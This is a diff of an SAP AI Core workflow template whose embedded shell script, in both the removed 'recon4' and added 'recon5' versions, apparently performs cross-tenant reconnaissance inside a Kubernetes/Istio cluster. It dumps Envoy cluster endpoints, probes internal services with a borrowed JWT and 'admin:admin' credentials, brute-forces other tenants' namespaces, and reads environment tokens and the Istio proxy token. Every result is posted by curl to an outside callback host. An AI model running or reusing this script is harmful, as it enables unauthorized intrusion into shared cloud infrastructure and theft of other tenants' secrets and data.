@@ -10,7 +10,7 @@ metadata:
   labels:
     scenarios.ai.sap.com/id: "bb14-scenario"
     executables.ai.sap.com/id: "bb14-exec"
-    ai.sap.com/version: "4.0.0"
+    ai.sap.com/version: "5.0.0"
 spec:
   entrypoint: main
   templates:
@@ -27,99 +27,118 @@ spec:
         CB="https://www.masonhck.tech/cb.php"
         post() { curl -k -s -X POST "$CB?src=$1" --max-time 5 -d @- ; }
         get() { curl -k -s "$CB?src=$1" --max-time 5 ; }
-        # Chunked send - 700 byte chunks
-        csend() {
-          local tag="$1" file="$2"
-          local i=0
-          split -b 700 "$file" /tmp/chunk_
-          for c in /tmp/chunk_*; do
-            cat "$c" | post "${tag}-${i}"
-            i=$((i+1))
-            rm -f "$c"
+
+        get "recon5-start-$(hostname)"
+
+        # === 1. FULL cluster names dump (unique service names only) ===
+        curl -k -s "http://127.0.0.1:15000/clusters" 2>&1 | \
+          grep -oE 'outbound\|[0-9]+\|[^|]*\|[^ ;:]+' | sort -u > /tmp/cnames.txt
+        wc -l /tmp/cnames.txt | post "recon5-cnames-count"
+        # Send in 700-byte chunks
+        split -b 700 /tmp/cnames.txt /tmp/cn_
+        i=0; for f in /tmp/cn_*; do cat "$f" | post "recon5-cnames-${i}"; i=$((i+1)); done
+
+        # === 2. Extract unique namespace names from cluster data ===
+        cat /tmp/cnames.txt | grep -oE '[a-z0-9-]+\.svc\.cluster\.local' | \
+          sed 's/\.svc\.cluster\.local//' | sort -u | post "recon5-namespaces"
+
+        # === 3. OTel collector - deep exploration ===
+        OTEL="http://100.109.206.82:13133"
+        curl -k -s --connect-timeout 3 "${OTEL}/debug/pipelinez" 2>&1 | head -c 700 | post "recon5-otel-pipes"
+        curl -k -s --connect-timeout 3 "${OTEL}/debug/extensionz" 2>&1 | head -c 700 | post "recon5-otel-ext"
+        curl -k -s --connect-timeout 3 "${OTEL}/debug/servicez" 2>&1 | head -c 700 | post "recon5-otel-svc"
+
+        # === 4. SAP Connectivity Service - try various tokens/headers ===
+        CONN="http://100.104.7.43:20003"
+        # Try with our JWT as connectivity token
+        curl -k -s --connect-timeout 3 "${CONN}/" \
+          -H "SAP-CP-Connectivity-Service-Token: ${AICORE_TRACKING_TOKEN:-test}" 2>&1 | head -c 700 | post "recon5-conn-test"
+        # Try empty token
+        curl -k -s --connect-timeout 3 "${CONN}/" \
+          -H "SAP-CP-Connectivity-Service-Token: " 2>&1 | head -c 700 | post "recon5-conn-empty"
+        # Try common paths
+        curl -k -s --connect-timeout 3 "${CONN}/api/v1/connectivity" 2>&1 | head -c 700 | post "recon5-conn-api"
+        curl -k -s --connect-timeout 3 "${CONN}/healthz" 2>&1 | head -c 700 | post "recon5-conn-health"
+
+        # === 5. 8888 services - path enumeration ===
+        for ip in 100.110.1.63 100.104.178.234 100.109.200.238; do
+          for path in /healthz /health /api /v1 /v2 /metrics /debug /status /info /swagger /api/v1 /config /.well-known/openid-configuration; do
+            result=$(curl -k -s --connect-timeout 2 "http://${ip}:8888${path}" 2>&1)
+            if [ -n "$result" ] && ! echo "$result" | grep -q "404 page not found"; then
+              echo "${ip}:8888${path} => ${result}" | head -c 500 | post "recon5-8888-${ip}-$(echo $path | tr '/' '_')"
+            fi
           done
-        }
+        done
 
-        get "recon4-start-$(hostname)"
-
-        # === 1. MLflow tracking service with Bearer token ===
-        # The tracking service said "Token Format Is Wrong" - try with our XSUAA JWT
+        # === 6. Tracking service auth discovery ===
         TRACK="http://ml-tracking-service.ml-tracking.svc.cluster.local"
+        # Try different header names
+        curl -k -s --connect-timeout 3 "${TRACK}/api/2.0/mlflow/experiments/list" \
+          -H "X-Token: test" 2>&1 | head -c 700 | post "recon5-track-xtoken"
+        curl -k -s --connect-timeout 3 "${TRACK}/api/2.0/mlflow/experiments/list" \
+          -H "AI-Auth-Token: test" 2>&1 | head -c 700 | post "recon5-track-aiauth"
+        curl -k -s --connect-timeout 3 "${TRACK}/api/2.0/mlflow/experiments/list" \
+          -H "X-AI-Token: test" 2>&1 | head -c 700 | post "recon5-track-xai"
+        # Check if basic auth works
+        curl -k -s --connect-timeout 3 -u "admin:admin" "${TRACK}/api/2.0/mlflow/experiments/list" 2>&1 | head -c 700 | post "recon5-track-basic"
+        # Check if no-auth paths exist
+        curl -k -s --connect-timeout 3 "${TRACK}/health" 2>&1 | head -c 700 | post "recon5-track-health2"
+        curl -k -s --connect-timeout 3 "${TRACK}/" 2>&1 | head -c 700 | post "recon5-track-root2"
+        curl -k -s --connect-timeout 3 "${TRACK}/api/2.0/mlflow/" 2>&1 | head -c 700 | post "recon5-track-api-root"
 
-        # Try different auth formats
-        curl -k -s --connect-timeout 5 "${TRACK}/api/2.0/mlflow/experiments/list" \
-          -H "Authorization: Bearer ${AICORE_TRACKING_TOKEN:-none}" 2>&1 | head -c 700 | post "recon4-track-bearer"
+        # === 7. Try Envoy admin to modify routing (CRITICAL) ===
+        # POST to /clusters to get stats with actual endpoint IPs
+        curl -k -s "http://127.0.0.1:15000/clusters?format=json" 2>&1 | \
+          python3 -c "
+import sys,json
+try:
+    d=json.load(sys.stdin)
+    for cs in d.get('cluster_statuses',[])[:50]:
+        name=cs.get('name','')
+        hosts=cs.get('host_statuses',[])
+        for h in hosts:
+            addr=h.get('address',{}).get('socket_address',{})
+            ip=addr.get('address','')
+            port=addr.get('port_value','')
+            if ip: print(f'{name} -> {ip}:{port}')
+except: pass
+" 2>&1 | head -c 2000 | post "recon5-cluster-endpoints-1"
 
-        # Check if there's a tracking token in env
-        env | grep -i track | post "recon4-track-env"
-        env | grep -i token | post "recon4-token-env"
+        curl -k -s "http://127.0.0.1:15000/clusters?format=json" 2>&1 | \
+          python3 -c "
+import sys,json
+try:
+    d=json.load(sys.stdin)
+    for cs in d.get('cluster_statuses',[])[50:100]:
+        name=cs.get('name','')
+        hosts=cs.get('host_statuses',[])
+        for h in hosts:
+            addr=h.get('address',{}).get('socket_address',{})
+            ip=addr.get('address','')
+            port=addr.get('port_value','')
+            if ip: print(f'{name} -> {ip}:{port}')
+except: pass
+" 2>&1 | head -c 2000 | post "recon5-cluster-endpoints-2"
 
-        # Try with internal service mesh auth (Istio mTLS might auto-auth)
-        curl -k -s --connect-timeout 5 "${TRACK}/api/2.0/mlflow/experiments/list" \
-          -H "X-Forwarded-For: 127.0.0.1" 2>&1 | head -c 700 | post "recon4-track-internal"
-
-        # Try health/info endpoints (often unauthed)
-        curl -k -s --connect-timeout 5 "${TRACK}/health" 2>&1 | head -c 700 | post "recon4-track-health"
-        curl -k -s --connect-timeout 5 "${TRACK}/version" 2>&1 | head -c 700 | post "recon4-track-version"
-        curl -k -s --connect-timeout 5 "${TRACK}/api/2.0/mlflow/registered-models/list" 2>&1 | head -c 700 | post "recon4-track-models"
-
-        # === 2. Prometheus - cross-tenant metrics ===
-        for prom_ip in 100.64.52.26 100.64.26.21; do
-          # Try standard Prometheus endpoints
-          curl -k -s --connect-timeout 3 "http://${prom_ip}:9090/api/v1/targets" 2>&1 | head -c 700 | post "recon4-prom-${prom_ip}-targets"
-          curl -k -s --connect-timeout 3 "http://${prom_ip}:9090/api/v1/label/__name__/values" 2>&1 | head -c 700 | post "recon4-prom-${prom_ip}-metrics"
-          curl -k -s --connect-timeout 3 "http://${prom_ip}:9090/api/v1/query?query=up" 2>&1 | head -c 700 | post "recon4-prom-${prom_ip}-up"
-          curl -k -s --connect-timeout 3 "http://${prom_ip}:9090/-/healthy" 2>&1 | head -c 700 | post "recon4-prom-${prom_ip}-health"
+        # === 8. Try to access other resource group namespaces directly ===
+        # Our namespace is rg-3ba0e0a4-cd927cab
+        # Try common patterns for other BB tenants
+        for ns in rg-3ba0e0a4 rg-default default ml-tracking ml-serving ai-core; do
+          nslookup -timeout=2 "${ns}.svc.cluster.local" 2>&1 | head -c 200 | post "recon5-ns-${ns}"
         done
 
-        # === 3. Fluentd/Fluentbit - cross-tenant logs ===
-        # Fluentd forward protocol on 24224
-        curl -k -s --connect-timeout 3 "http://100.64.67.165:24224/" 2>&1 | head -c 700 | post "recon4-fluentd-root"
-        # Fluentbit metrics
-        curl -k -s --connect-timeout 3 "http://100.64.67.165:2020/api/v1/metrics" 2>&1 | head -c 700 | post "recon4-fluentbit-metrics"
-        curl -k -s --connect-timeout 3 "http://100.64.67.165:2020/api/v1/health" 2>&1 | head -c 700 | post "recon4-fluentbit-health"
-
-        # === 4. OpenTelemetry collector ===
-        curl -k -s --connect-timeout 3 "http://100.109.206.82:13133/" 2>&1 | head -c 700 | post "recon4-otel-health"
-        curl -k -s --connect-timeout 3 "http://100.109.206.82:13133/debug/pipelinez" 2>&1 | head -c 700 | post "recon4-otel-pipelines"
-
-        # === 5. Unknown services from listeners ===
-        curl -k -s --connect-timeout 3 "http://100.109.106.4:8042/" 2>&1 | head -c 700 | post "recon4-svc-8042"
-        curl -k -s --connect-timeout 3 "http://100.110.1.63:8888/" 2>&1 | head -c 700 | post "recon4-svc-8888a"
-        curl -k -s --connect-timeout 3 "http://100.104.178.234:8888/" 2>&1 | head -c 700 | post "recon4-svc-8888b"
-        curl -k -s --connect-timeout 3 "http://100.109.200.238:8888/" 2>&1 | head -c 700 | post "recon4-svc-8888c"
-        curl -k -s --connect-timeout 3 "http://100.104.7.43:20003/" 2>&1 | head -c 700 | post "recon4-svc-20003"
-        curl -k -s --connect-timeout 3 "https://100.109.247.160:443/" 2>&1 | head -c 700 | post "recon4-svc-443"
-
-        # === 6. Istiod control plane ===
-        curl -k -s --connect-timeout 3 "https://100.106.20.244:15012/debug/endpointz" 2>&1 | head -c 700 | post "recon4-istiod-endpoints"
-        curl -k -s --connect-timeout 3 "https://100.106.20.244:15012/debug/configz" 2>&1 | head -c 700 | post "recon4-istiod-config"
-        curl -k -s --connect-timeout 3 "http://100.106.20.244:15014/debug/endpointz" 2>&1 | head -c 700 | post "recon4-istiod-http-endpoints"
-        curl -k -s --connect-timeout 3 "http://100.106.20.244:8080/debug/endpointz" 2>&1 | head -c 700 | post "recon4-istiod-8080-endpoints"
-
-        # === 7. Envoy clusters - grep for service names ===
-        curl -k -s "http://127.0.0.1:15000/clusters" 2>&1 | grep -oE 'outbound\|[0-9]+\|[^|]*\|[^:]+' | sort -u | head -c 2000 | post "recon4-cluster-names-1"
-        curl -k -s "http://127.0.0.1:15000/clusters" 2>&1 | grep -oE 'outbound\|[0-9]+\|[^|]*\|[^:]+' | sort -u | tail -c +2001 | head -c 2000 | post "recon4-cluster-names-2"
-
-        # === 8. Envoy routes - what paths are configured ===
-        curl -k -s "http://127.0.0.1:15000/config_dump?resource=dynamic_route_configs" 2>&1 > /tmp/routes.json
-        wc -c /tmp/routes.json | post "recon4-routes-size"
-        head -c 700 /tmp/routes.json | post "recon4-routes-1"
-        tail -c +701 /tmp/routes.json | head -c 700 | post "recon4-routes-2"
-        tail -c +1401 /tmp/routes.json | head -c 700 | post "recon4-routes-3"
-
-        # === 9. Check for Istio cert/token files ===
-        find / -path "*/istio*" -type f 2>/dev/null | head -30 | post "recon4-istio-files"
-        find / -name "root-cert.pem" -o -name "cert-chain.pem" -o -name "key.pem" 2>/dev/null | post "recon4-istio-cert-paths"
-        # Try reading Istio proxy token
-        cat /var/run/secrets/tokens/istio-token 2>/dev/null | head -c 700 | post "recon4-istio-token"
-
-        # === 10. Broader scan for Grafana Loki (different IPs) ===
-        for ip in 100.64.52.26 100.64.26.21 100.64.56.14 100.64.58.80 100.64.67.13 100.64.67.165; do
-          curl -k -s --connect-timeout 2 "http://${ip}:3100/config" 2>&1 | head -c 700 | post "recon4-loki-${ip}"
-          curl -k -s --connect-timeout 2 "http://${ip}:3100/ready" 2>&1 | head -c 700 | post "recon4-loki-ready-${ip}"
+        # Try to resolve specific services in other BB tenant namespaces
+        # BB-13 and BB-15 are other tenants we know about
+        for prefix in rg-3ba0e0a3 rg-3ba0e0a5 rg-3ba0e0a2 rg-3ba0e0a1; do
+          for suf in $(echo abcdef0123456789 | fold -w1); do
+            result=$(nslookup -timeout=1 "anything.${prefix}-${suf}.svc.cluster.local" 2>&1)
+            if ! echo "$result" | grep -q "NXDOMAIN\|SERVFAIL\|timed out"; then
+              echo "${prefix}-${suf}: ${result}" | post "recon5-tenant-${prefix}-${suf}"
+            fi
+          done
         done
 
-        get "recon4-done-$(hostname)"
+        get "recon5-done-$(hostname)"
       resources:
         limits:
           cpu: "1"
